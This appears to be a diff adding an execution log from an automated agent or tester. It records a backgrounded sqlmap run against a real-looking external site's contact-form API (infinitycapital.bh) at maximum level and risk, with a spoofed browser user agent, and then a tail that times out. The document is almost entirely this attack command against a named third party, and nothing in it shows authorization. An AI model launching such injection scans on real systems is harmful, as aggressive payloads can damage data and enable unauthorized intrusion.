@@ -1,0 +1,12 @@
+# command: cd /work && UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
+setsid sqlmap -u "https://www.infinitycapital.bh/api/send" --method=POST --data="fname=vapt&lname=probe&areacode=973&tel=1234567&cname=probe&subject=probe&msg=probemsg&check=1&targets=probe@localhost.invalid" -p "fname,lname,areacode,tel,cname,subject,msg,check,targets" --batch --level=5 --risk=3 --threads=4 -A "$UA" --output-dir=/work/tool_outputs/sqlmap_send > tool_outputs/sqlmap_send.log 2>&1 < /dev/null &
+sleep 6; tail -n 5 tool_outputs/sqlmap_send.log
+# tool: tail
+# exit_code: 124
+# ts: 2026-09-30T11:11:27.602056+00:00
+# ---
+
+
+[exec timeout after 300s]
+
+[exit=124]
